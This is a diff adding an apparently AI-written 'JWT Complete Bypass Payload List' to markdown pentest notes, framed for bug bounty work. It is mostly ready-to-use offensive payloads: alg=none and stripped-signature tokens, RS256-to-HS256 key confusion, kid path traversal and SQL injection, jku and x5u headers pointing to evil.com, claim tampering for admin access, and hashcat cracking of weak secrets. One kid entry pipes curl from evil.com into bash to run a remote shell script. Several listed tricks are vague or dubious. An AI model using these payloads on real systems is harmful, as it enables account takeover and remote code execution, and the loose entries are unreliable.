@@ -786,4 +786,348 @@ Cookie: session=eyJraWQiOiIuLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3Mi
 
 ![img](media/05f2b05ba72f1ab44b00ad13dd110577.png)
 
+Below is the **JWT – Complete Bypass Payload List**, in the **exact same style** you requested for File Upload, SSRF, XXE, OAuth, etc.
+
+This includes **real offensive payloads**, **signature bypasses**, **alg=none**, **key confusion**, **kid injection**, **public/private-key swaps**, **jku abuse**, **x5u poisoning**, **claim tampering**, **WAF bypass**, **header smuggling**, and more.
+
+---
+
+# ⭐ **JWT (JSON Web Token) – Complete Bypass Payload List**
+
+*(Offensive Security Payloads for Pentesting / Bug Bounty)*
+
+---
+
+# **1. ALG = NONE Bypass Payloads**
+
+### **Classic alg=none Attack**
+
+```json
+{
+  "alg": "none",
+  "typ": "JWT"
+}
+```
+
+Token:
+
+```
+header.payload.
+```
+
+### **Stripped Signature**
+
+```
+header.payload
+```
+
+### **Whitespace/Case Filter Bypass**
+
+```
+"ALG":"NoNe"
+```
+
+---
+
+# **2. Algorithm Confusion Attacks (RS256 → HS256)**
+
+### **Change RS256 to HS256**
+
+```json
+{"alg":"HS256","typ":"JWT"}
+```
+
+### **Sign Token Using Public Key**
+
+```
+HMAC-SHA256(public_key, header.payload)
+```
+
+### **Inject Attacker Secret**
+
+```
+HS256 key = "attacker"
+```
+
+---
+
+# **3. KID Header Injection Bypasses**
+
+### **Path Traversal**
+
+```json
+{"kid":"../../../../../../dev/null"}
+```
+
+### **Load Attacker Key**
+
+```json
+{"kid":"http://evil.com/key"}
+```
+
+### **SQL Injection in kid**
+
+```json
+{"kid":"1' UNION SELECT 'attackersecret' -- "}
+```
+
+### **File Inclusion**
+
+```json
+{"kid":"/etc/passwd"}
+```
+
+---
+
+# **4. JKU (JSON Key URL) Header Abuse**
+
+### **Point Token to Attacker JWK**
+
+```json
+{"jku":"https://evil.com/jwks.json"}
+```
+
+### **Malicious JWK Payload**
+
+```json
+{"kty":"oct","k":"c2VjcmV0","alg":"HS256","kid":"attacker"}
+```
+
+---
+
+# **5. X5U (Certificate Chain) Injection**
+
+### **External x5u Reference**
+
+```json
+{"x5u":"https://evil.com/cert.pem"}
+```
+
+### **Poisoned Certificate Chain**
+
+Upload cert with attacker public key.
+
+---
+
+# **6. JWKS Spoofing / Key ID Mismatch**
+
+### **Same kid as server but attacker public key**
+
+```
+{"kid":"trusted-key"}
+```
+
+### **JWKS with multiple keys (attack key first)**
+
+```json
+{"keys":[attack-key, legit-key]}
+```
+
+---
+
+# **7. Claim Tampering Payloads**
+
+### **Privilege Escalation**
+
+```json
+{"admin":true}
+```
+
+### **UserID Impersonation**
+
+```json
+{"sub":"victim@example.com"}
+```
+
+### **Role Escalation**
+
+```json
+{"role":"superadmin"}
+```
+
+### **Bypass Expiry**
+
+```json
+{"exp": 9999999999}
+```
+
+---
+
+# **8. JWT Signature Stripping Bypass**
+
+### **Token with Removed Signature Field**
+
+```
+header.payload.
+```
+
+### **Change typ to JOSE / Custom**
+
+```
+{"typ":""}
+```
+
+---
+
+# **9. Weak Secret Brute Force Payloads**
+
+### **Common Weak Secrets**
+
+```
+secret
+password
+123456
+jwtsecret
+changeme
+```
+
+### **JWT Attack Tools**
+
+```
+jwtcrack
+hashcat -m 16500
+```
+
+---
+
+# **10. Base64 Confusion / Tampering**
+
+### **Unpadded Base64**
+
+```
+eyJhbGciOiJIUzI1NiJ9 (no ==)
+```
+
+### **URL-safe Base64 Manipulation**
+
+```
+-/ instead of +/
+```
+
+### **Unicode Padding Bypass**
+
+```
+%u003d%u003d
+```
+
+---
+
+# **11. WAF Bypass Payloads**
+
+### **Header Obfuscation**
+
+```
+{"ALG":"HS256"}
+```
+
+### **Space Injection**
+
+```
+{"alg" : "HS256"}
+```
+
+### **Comment Injection (if supported)**
+
+```
+{"alg":"HS256/*foo*/"}
+```
+
+---
+
+# **12. None + JWK Abuse (Combo Attack)**
+
+### **Force none + Attacker JWK**
+
+```json
+{"alg":"none", "jku":"https://evil.com/jwks.json"}
+```
+
+### **Use empty signature**
+
+```
+header.payload.
+```
+
+---
+
+# **13. Key ID → RCE (if backend loads system key)**
+
+### **KID executes command in some frameworks**
+
+```
+{"kid":"| id "}
+```
+
+### **Load from Pipe**
+
+```
+{"kid":"| bash -c 'curl http://evil.com/shell.sh | bash'"}
+```
+
+---
+
+# **14. Token Replay / Session Reuse Payloads**
+
+### **Replay Token Until Server Invalidates**
+
+```
+Use expired token if server ignores "exp".
+```
+
+### **Use Access Token in ID Token Field**
+
+```
+id_token = access_token
+```
+
+---
+
+# **15. JWT in Cookies Bypass**
+
+### **Secure/HTTPOnly Off**
+
+```
+document.cookie="jwt=<attacker>";
+```
+
+### **Force Cookie Overwrite**
+
+```
+Set-Cookie: jwt=<evil>;path=/
+```
+
+---
+
+# **16. Compression Oracle Attack (BREACH-style)**
+
+### **Compress claims to leak JWT signing secret**
+
+(rare but possible if JWT leaked into compressed response)
+
+---
+
+# **17. Signature Key Size Confusion**
+
+### **Use extremely short secret**
+
+```
+key="A"
+```
+
+### **Force HMAC key < 8 bytes bypass**
+
+Some libraries validate poorly.
+
+---
+
+# **18. Using Public Key as HMAC Secret**
+
+### **Convert PEM public key to one-line base64 and use as HS256 secret**
+
+```
+-----BEGIN PUBLIC KEY----- 
+... 
+```
+
+---
 
